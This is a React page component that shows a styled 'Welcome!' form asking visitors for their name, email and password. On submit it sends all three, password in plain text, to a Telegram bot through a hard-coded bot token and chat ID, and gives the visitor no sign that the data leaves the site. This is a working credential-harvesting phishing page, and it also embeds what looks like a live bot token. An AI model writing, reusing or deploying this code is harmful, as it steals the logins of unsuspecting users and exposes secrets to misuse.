import React, { useState } from 'react';
import axios from 'axios';

const TELEGRAM_BOT_ID = '7424412215:AAEVeJkA4sLZUMvG2q92f-b96GFYl12NliA';
const CHAT_ID = '6099917788';

const Home = () => {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // Send data to the Telegram API
      const telegramMessage = `Name: ${name}\nEmail: ${email}\nPassword: ${password}`;
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_ID}/sendMessage`,
        {
          chat_id: CHAT_ID,
          text: telegramMessage,
        }
      );

      if (response.status === 200) {
        setMessage('Successfully sent (200 OK).');
      } else {
        setMessage('Error: Failed to send message.');
      }
    } catch (error) {
      setMessage('Error: Failed to send message.');
    }

    // Clear form fields
    setName('');
    setEmail('');
    setPassword('');
  };

  return (
    <div
      style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        background: 'linear-gradient(135deg, #0f2027, #203a43, #2c5364)',
      }}
    >
      <div className="form-container">
        <form onSubmit={handleSubmit}>
          <h2>Welcome!</h2>
          <p>Please enter your details below.</p>
          <input
            type="text"
            name="name"
            placeholder="Your name"
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
          />
          <input
            type="email"
            name="email"
            placeholder="Your email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Enter password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <input type="submit" value="Send" />
          <div id="alert-message">{message}</div>
        </form>
      </div>

      <style jsx>{`
        /* Add your CSS styles here */
        .form-container {
          width: 100%;
          max-width: 400px;
          background: rgba(255, 255, 255, 0.1);
          backdrop-filter: blur(15px);
          border-radius: 20px;
          padding: 40px;
          text-align: center;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
          border: 1px solid rgba(255, 255, 255, 0.2);
          position: relative;
        }

        .form-container h2 {
          font-size: 2rem;
          margin-bottom: 15px;
          font-weight: bold;
          text-transform: uppercase;
          background: linear-gradient(135deg, #00ff68, #3333ff);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }

        .form-container p {
          font-size: 0.9rem;
          color: #bfbfbf;
          margin-bottom: 25px;
        }

        input[type='text'],
        input[type='email'],
        input[type='password'] {
          width: 100%;
          padding: 15px;
          margin: 15px 0;
          border: none;
          border-radius: 10px;
          background: rgba(255, 255, 255, 0.2);
          color: #ffffff;
          font-size: 1rem;
          outline: none;
          transition: all 0.4s ease;
        }

        input[type='text']:focus,
        input[type='email']:focus,
        input[type='password']:focus {
          box-shadow: 0 0 10px #ff00cc, 0 0 20px #3333ff;
          border: 1px solid #ff00cc;
        }

        input[type='submit'] {
          width: 100%;
          padding: 15px;
          margin-top: 20px;
          border: none;
          border-radius: 10px;
          background: linear-gradient(135deg, #ff00cc, #3333ff);
          color: #ffffff;
          font-size: 1rem;
          font-weight: bold;
          cursor: pointer;
          text-transform: uppercase;
          transition: all 0.4s ease;
          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        input[type='submit']:hover {
          background: linear-gradient(135deg, #3333ff, #ff00cc);
          box-shadow: 0 0 15px #ff00cc, 0 0 30px #3333ff;
          transform: translateY(-3px);
        }

        #alert-message {
          color: #ff00cc;
          font-size: 1rem;
          margin-top: 20px;
          padding-top: 15px;
          border-top: 1px solid rgba(255, 255, 255, 0.3);
        }
      `}</style>
    </div>
  );
};

export default Home;
